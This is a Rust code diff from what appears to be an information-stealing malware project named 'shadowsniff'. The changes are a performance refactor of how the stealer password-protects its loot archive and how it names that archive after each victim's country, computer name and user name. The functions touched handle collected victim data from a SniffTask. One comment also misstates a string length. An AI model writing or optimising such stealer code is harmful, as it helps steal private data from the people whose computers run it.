@@ -64,15 +64,19 @@ pub fn run() {
     SniffTask::default().run(out, &fs, &collector);
 
     let password: String = {
-        let charset: Vec<char> = "shadowsniff0123456789".chars().collect();
+        const CHARSET: &str = "shadowsniff0123456789";
+        const PASSWORD_LEN: usize = 15;
         let mut rng = ChaCha20Rng::from_nano_time();
-
-        (0..15)
-            .map(|_| {
-                let idx = (rng.next_u32() as usize) % charset.len();
-                charset[idx]
-            })
-            .collect()
+        // Pre-allocate String with exact capacity
+        let mut result = String::with_capacity(PASSWORD_LEN);
+        
+        // Use bytes instead of chars for better performance (all ASCII)
+        let charset_bytes = CHARSET.as_bytes();
+        for _ in 0..PASSWORD_LEN {
+            let idx = (rng.next_u32() as usize) % charset_bytes.len();
+            result.push(charset_bytes[idx] as char);
+        }
+        result
     };
 
     let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
@@ -92,6 +96,7 @@ pub fn run() {
     include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
 }
 
+#[inline]
 fn generate_log_name() -> Arc<str> {
     let PcInfo {
         computer_name,
@@ -101,5 +106,15 @@ fn generate_log_name() -> Arc<str> {
 
     let IpInfo { country, .. } = unwrapped_ip_info();
 
-    format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
+    // Pre-allocate with estimated capacity (country ~2-3, names ~10-20 each, extension ~20)
+    let capacity = 3 + 2 + computer_name.len() + 1 + user_name.len() + 21; // 21 = ".shadowsniff.zip"
+    let mut result = String::with_capacity(capacity);
+    result.push('[');
+    result.push_str(&country);
+    result.push_str("] ");
+    result.push_str(&computer_name);
+    result.push('-');
+    result.push_str(&user_name);
+    result.push_str(".shadowsniff.zip");
+    result.into()
 }
